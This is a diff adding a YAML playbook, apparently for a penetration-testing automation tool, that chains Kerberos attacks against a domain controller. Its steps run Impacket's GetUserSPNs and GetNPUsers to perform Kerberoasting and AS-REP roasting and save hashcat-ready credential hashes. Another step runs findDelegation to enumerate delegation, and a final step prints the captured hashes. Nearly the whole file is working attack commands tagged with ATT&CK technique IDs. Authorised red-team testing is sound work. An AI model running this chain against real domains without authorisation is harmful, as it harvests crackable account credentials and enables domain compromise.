@@ -1,0 +1,38 @@
+name: kerberos-attacks
+description: "Kerberos attack chain — kerberoast, AS-REP roast, delegation abuse"
+timeout: 3600
+
+inputs:
+  - name: target
+    required: true
+  - name: domain
+    required: true
+  - name: username
+    default: ""
+  - name: password
+    default: ""
+
+steps:
+  - name: kerberoast
+    cmd: "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} -request -outputfile {work_dir}/kerberoast.txt 2>&1"
+    tags: [kerberoast, T1558.003]
+    timeout: 300
+    on_fail: continue
+
+  - name: asreproast
+    cmd: "impacket-GetNPUsers '{domain}/' -dc-ip {target} -usersfile {work_dir}/users.txt -format hashcat -outputfile {work_dir}/asrep.txt 2>&1 || echo 'AS-REP roast completed'"
+    tags: [asreproast, T1558.004]
+    timeout: 300
+    on_fail: continue
+
+  - name: delegation_enum
+    cmd: "impacket-findDelegation '{domain}/{username}:{password}' -dc-ip {target} 2>&1 || echo 'Delegation enum completed'"
+    tags: [delegation, T1134.001]
+    timeout: 300
+    on_fail: continue
+
+  - name: show_results
+    cmd: "echo '=== Kerberoast ===' && cat {work_dir}/kerberoast.txt 2>/dev/null && echo '=== AS-REP ===' && cat {work_dir}/asrep.txt 2>/dev/null || echo 'No hashes captured'"
+    tags: [kerberos]
+    timeout: 60
+    depends_on: kerberoast
